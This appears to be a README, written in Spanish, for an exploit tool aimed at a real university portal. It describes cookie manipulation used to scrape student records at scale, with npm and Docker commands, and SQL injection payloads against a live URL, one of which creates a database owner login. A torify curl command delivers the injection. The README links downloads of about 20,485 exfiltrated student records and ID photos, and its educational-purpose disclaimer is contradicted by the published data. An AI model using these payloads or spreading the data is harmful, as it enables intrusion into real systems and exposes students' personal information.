
<div align="end">
<img
 style="object-fit: cover;"
 src="./assets/icons8-hack-60.png" >
</div>

# Script scraping vunerability from uped portal

> [!CAUTION]
> Este script fue creado con fines educativos,en ningun momento se pretende hacer daño a la universidad o a su portal web al contrario se pretende ayudar a mejorar la seguridad de la misma

## 🗒️ Descripcion

Script que permite obtener la información de estudiantes y la sesion de un usuario en el portal de la universidad. Ademas de poder inyectar codigo SQL en una cookie en la base de datos de la universidad.

## 🍪 En que consiste la vulnerabilidad

La vunerabilidad consiste en manipular la cookie de una session para obtener la informacion de un usuario sin necesidad de logearse en el portal de la universidad.

la estructura de cookie es la siguiente:

```json
{
  ".ASPXAUTH": "puede ser cualquier sesion",
  "ASP.NET_SessionId": "id de la session del autenticacion",
  "CodigoUsuario": "codigo del usuario",
  "usuario": "nombre del usuario",
}
```

## 📋 Requisitos

- Node.js v20.0.0

## 🚀 Instalación

```bash
git clone https://github.com/epmyas2022/uped-vunerabilidad.git
```

```bash
npm install
```

Configurar las variables de entorno en el archivo `.env`

```env
ASPXAUTH=#de cualquier sesion
SESSION_ID=#id de la session del autenticacion
ARGS=#argumentos para el navegador
```

## 💻 Comandos

Obtener la informacion del expediente de los estudiantes basados en un rango  x1 a x2

```bash
npm run general <x1> <x2> [optional | Boolean] <headless>
```

Obtener la sesion de un usuario

```bash
npm run login <user> <codigo>
```

Obtener la sesion del portal de pagos de un estudiante

```bash
npm run pagos <user> <codigo>
```

## 🐳 Con docker

Esto es util para ejecutar el script en un contenedor docker, podriamos ejecutar x cantidad de contenedores para obtener la informacion de los estudiantes.

Construir la imagen (builder)

```bash
docker build -f .docker/Dockerfile --target builder -t uped-vunerabilidad .
```

Construir el contenedor

```bash
docker run -it -d -e ASPXAUTH=token -e SESSION_ID=id -e FROM=desde -e TO=hasta --privileged --security-opt seccomp=.docker/chrome.json uped-vunerabilidad
```

## 📂 Estructura de archivos

Dentro de la carpeta data se encuentra varios datos con que se comprobo la vulnerabilidad del portal de la universidad. estos datos obtenidos fueron mediante el script aprovechando la vulnerabilidad.
en total existen aproximadamente **20,485** registros de estudiantes.

## 💉 Vunerabilidad en inyeccion de SQL

Se descubrio otra vunerabilidad que permite inyectar codigo SQL en una cookie y mediante esto se logro obtener acceso a la base de datos de la universidad. La url a la que se le inyecto el codigo SQL fue la siguiente:

```url
https://myappcloud.net/uped/portal_catedratico/externa.aspx
```

Ejemplo de inyeccion SQL

Con esto se valida si es vulnerable a inyeccion SQL si es vunerable se demorara 20 segundos en responder.

```sql
' BEGIN WAITFOR DELAY '0:0:20'--
```

Con la siguiente inyeccion se logro encontrar cual es el nombre de la base de datos de la universidad.

```sql
' IF EXIST (SELECT 1 FROM sys.databases WHERE name LIKE '%uonline_uped%') BEGIN WAITFOR DELAY '0:0:20' END--
```

Con la siguiete inyeccion se logro crear un usuario en la base de datos de la universidad para su posterior uso.

```sql
'IF  (SELECT COUNT(*) FROM sys.databases WHERE name LIKE 'uonline_uped') > 0 BEGIN USE uonline_uped CREATE LOGIN mssql_user WITH password = 'your_password' CREATE USER mssql_user FOR LOGIN mssql_user ALTER ROLE db_owner ADD MEMBER mssql_user WAITFOR DELAY '0:0:20' END--
```

Ejemplo de `curl` para inyectar codigo SQL

```bash
torify curl -X GET "https://myappcloud.net/uped/portal_catedratico/externa.aspx" \
  --cookie ".ASPXAUTH=<auth_de_cualquier_sesion>" \
  --cookie "ASP.NET_SessionId=<id_de_cualquier_sesion>" \
  --cookie "CodigoUsuario=1789" \
  --cookie "Usuario=<injection_sql>" 
```

## 💻 Descargar datos

- Tabla de *ra_per_personas* (informacion de estudiantes) [aqui](https://u.pcloud.link/publink/show?code=XZvRx55ZgUc7an7IIyfF27CLa93Wo7KCf6Yy)

- Tabla de *ra_per_foto_carne* (foto de carne de estudiantes) [aqui](https://u.pcloud.link/publink/show?code=XZ9sx55ZEXFqi3MoUjzyXUdw1isK1jm1Wu0y)

## 🔗 Sitios vulnerables

- [x] Portal de la universidad [aqui](https://myappcloud.net/uped/login.aspx)
- [x] Portal de pagos [aqui](https://saas.spsoftware.net/uped_pagos/)
- [x] Base de datos uonline_uped [aqui](https://myappcloud.net/uped/portal_catedratico/externa.aspx)
